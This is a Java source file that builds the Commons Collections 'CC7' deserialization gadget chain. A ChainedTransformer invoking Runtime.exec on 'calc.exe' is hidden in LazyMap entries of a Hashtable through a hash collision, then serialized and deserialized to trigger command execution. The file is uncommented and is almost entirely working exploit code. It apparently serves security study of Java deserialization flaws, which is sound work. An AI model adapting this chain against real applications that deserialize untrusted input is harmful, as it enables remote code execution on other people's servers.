import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class HashTableCC7 {
    public static void main(String[] args) throws Exception{
        Transformer[] fakeTransformers = {};

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);

        HashMap innerMap1 = new HashMap();
        innerMap1.put("yy", null);
        Map outerMap1 = LazyMap.decorate(innerMap1, chainedTransformer);

        HashMap innerMap2 = new HashMap();
        innerMap2.put("zZ", null);
        Map outerMap2 = LazyMap.decorate(innerMap2, chainedTransformer);

        Hashtable hashtable = new Hashtable();
        hashtable.put(outerMap1, "a");
        hashtable.put(outerMap2, "b");

        innerMap2.remove("yy");

        Util.setValue(chainedTransformer, "iTransformers", transformers);

        byte[] serial = Util.toSerial(hashtable);
        ObjectInputStream in = Util.fromSerial(serial);
        in.readObject();
    }
}
